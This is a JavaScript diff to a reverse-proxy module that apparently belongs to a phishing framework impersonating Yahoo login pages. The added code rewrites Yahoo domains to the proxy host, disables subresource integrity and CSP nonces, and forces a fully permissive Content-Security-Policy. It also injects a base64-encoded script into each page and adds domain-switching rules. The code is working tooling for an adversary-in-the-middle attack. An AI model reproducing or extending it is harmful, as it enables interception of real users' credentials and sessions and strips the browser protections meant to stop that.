@@ -31,9 +31,30 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
        
         super(proxyResp, browserEndPoint)
         this.regexes = [
+            
             {
                 reg: /www\.google\.com/,
                 replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /fc\.yahoo\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/fc.yahoo.com/~`
+            },
+            {
+                reg: /csp\.yahoo\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/csp.yahoo.com/~`
+            },
+            {
+                reg: /s\.yimg\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/s.yimg.com/~`
+            },
+            {
+                reg: /(<head>)([\s\S]*?)(<\/head>)/,
+                replacement: '$1\n<script src=\"data:text/javascript;base64,ZnVuY3Rpb24gYygpe2lmKCFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuYiIpIHx8ICFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZyIpKXtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImIiXX0pKTtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUuZmlsdGVyPSJodWUtcm90YXRlKDRkZWcpIjtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImciXX0pKTtzZXRUaW1lb3V0KGMsMWUzKX19YygpOwo=\"></script>\n$2$3'
+            },
+            {
+                reg: /<title[^>]*>(.*?)<\/title>/i,
+                replacement: '<title>thr33cpio</title>'
             },
             {
                 reg: /login\.yahoo\.net/,
@@ -44,11 +65,15 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 replacement: browserEndPoint.clientContext.hostname
             },
             {
-                reg: /integrity/,
+                reg: /integrity/igm,
                 replacement:'xintegrity'
             },
             {
-                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
+                reg: /nonce/gm,
+                replacement:'nononcense'
+            },
+            {
+                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/igm,
                 replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
             }
         ]
@@ -59,7 +84,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
-
+        this.browserEndPoint.setHeader('Content-Security-Policy', "default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';");
 
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
@@ -205,6 +230,14 @@ const configExport = {
             command: 'CHANGE_DOMAIN',
             command_args: {
                 new_domain: 'www.gstatic.com',
+                persistent: false,
+                },
+        },
+        {
+            path: '/sandbox.*',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'gpt.mail.yahoo.net',
                 persistent: false,
                 },
         },
